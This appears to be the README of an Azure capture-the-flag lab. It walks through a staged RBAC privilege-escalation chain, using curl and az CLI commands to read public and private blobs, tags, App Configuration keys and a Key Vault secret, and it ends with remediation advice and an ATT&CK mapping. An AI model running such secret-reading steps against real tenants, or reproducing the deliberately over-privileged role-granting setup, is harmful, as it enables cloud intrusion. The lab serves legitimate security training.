# Gatekeeper Chain — Flag-Gated RBAC Privilege Escalation

**Provider:** Azure | **Category:** Privilege Escalation / Chained

## Scenario

You start with an Azure AD account that has **no access to anything**. A
self-service "gatekeeper" app grants real Azure roles in exchange for proof that
you've completed the previous step: submit a correct flag and it adds the next
role to your account. Each new role lets you read one more resource, where you
find the next flag — a privilege-escalation ladder that ends at a Key Vault
secret.

The gatekeeper is a container with a **User Access Administrator** managed
identity, so the role grants it hands out are genuine — you really do gain new
RBAC on your own principal at each step.

## Attack Path

```
Stage 0  public blob (anonymous)         --submit flag--> Reader on resource group
Stage 1  resource-group tags (Reader)    --submit flag--> App Configuration Data Reader
Stage 2  App Configuration (Data Reader) --submit flag--> Storage Blob Data Reader
Stage 3  private blob (Blob Data Reader)  --submit flag--> Key Vault Secrets User
Stage 4  Key Vault secret (Secrets User)                 the flag
```

## Walkthrough

The deploy prints the attacker credentials, the gatekeeper URL, and the public
starting blob.

> First boot takes a few minutes (the gatekeeper installs its dependencies), and
> each granted role takes **1–2 minutes** to propagate before it works. If a step
> says "authorization failed", wait and retry.

### Stage 0 — get the first flag (no credentials needed)

```bash
curl -s "https://<storage-account>.blob.core.windows.net/public/welcome.txt"
```

### Unlock — submit the flag to the gatekeeper

```bash
GK="<gatekeeper-url>"     # e.g. http://cngk-gatekeeper-xxxx.westeurope.azurecontainer.io
curl -s -X POST "$GK/unlock" -H 'Content-Type: application/json' \
  -d '{"flag":"CUMULONIMBUS{unlock_1_reader_access}"}'
# {"status":"granted","unlocked":"Reader on the resource group", ...}
```

Now log in as the attacker (do this once; the new roles attach to this account):

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Stage 1 — Reader: read the resource-group tags

```bash
az group show --name <resource_group_name> --query tags
```

The tags contain the next flag and name the App Configuration store. Submit that
flag to the gatekeeper to unlock **App Configuration Data Reader**.

### Stage 2 — App Configuration Data Reader

```bash
az appconfig kv list --name <config-store> --auth-mode login --all -o table
```

Find the next flag, submit it, and unlock **Storage Blob Data Reader**.

### Stage 3 — Storage Blob Data Reader: read the private note

```bash
az storage blob download --account-name <storage-account> --auth-mode login \
  -c vault-notes -n notes.txt -f - 2>/dev/null
```

This gives the next flag and the Key Vault coordinates. Submit it to unlock
**Key Vault Secrets User**.

### Stage 4 — Key Vault Secrets User: read the flag

```bash
az keyvault secret show --vault-name <key-vault> --name app-flag --query value -o tsv
```

That value is the flag.

## Deployer requirement

The gatekeeper's managed identity is granted **User Access Administrator** on the
resource group. Creating that role assignment requires the **service principal
running the deployment to be Owner (or User Access Administrator)** on the
subscription — plain Contributor cannot delegate role-assignment rights and the
deploy will fail at that step.

## How to Fix in Production

- Don't expose a self-service endpoint that can assign roles; if you must,
  authenticate callers and scope grants tightly with approval workflows (PIM).
- Don't give an internet-facing workload's identity **User Access
  Administrator** / **Owner** — that lets a compromise of the workload escalate
  arbitrarily. Grant the minimum data-plane role it actually needs.
- Don't leave secrets/flags in public blobs, resource tags, App Configuration
  key-values, or non-secure storage. Use Key Vault references and private
  networking.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Account Manipulation: Additional Cloud Roles | [T1098.003](https://attack.mitre.org/techniques/T1098/003/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
